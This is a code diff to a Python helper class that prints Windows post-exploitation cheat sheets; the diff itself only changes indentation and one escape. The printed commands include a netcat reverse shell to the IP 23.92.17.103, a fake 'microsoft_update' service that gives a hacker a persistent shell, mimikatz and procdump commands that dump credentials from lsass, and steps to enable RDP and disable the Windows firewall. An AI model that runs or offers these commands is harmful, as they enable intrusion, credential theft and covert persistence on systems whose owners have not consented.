@@ -34,27 +34,27 @@ class auxilary:
         pass
 
     def windows_useful_cmds(self):
-	""" Useful Win commands, postex, pwdump, procdump.exe, etc. """
-	text = r"""
-	net localgroup Users
-	net localgroup Administrators
-	search dir/s *.doc
-	system("start cmd.exe /k $cmd")
-	sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
-	/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
-	mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
-	Procdump.exe -accepteula -ma lsass.exe lsass.dmp
-	mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
-	C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
-	C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
-	"""
-	print text
+    """ Useful Win commands, postex, pwdump, procdump.exe, etc. """
+		text = r"""
+		net localgroup Users
+		net localgroup Administrators
+		search dir/s *.doc
+		system("start cmd.exe /k $cmd")
+		sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
+		/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
+		mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
+		Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+		mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+		C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
+		C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
+		"""
+		print text
 
 
     def win_enable_rdp(self):
 	""" Enable Windows RDP, enable FW services """
 	text = """
-	reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+	reg add "hklm\system\currentcontrolset\control\\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
 	netsh firewall set service remoteadmin enable
 	netsh firewall set service remotedesktop enable
 	Turn off windows FW: netsh firewall set opmode disable
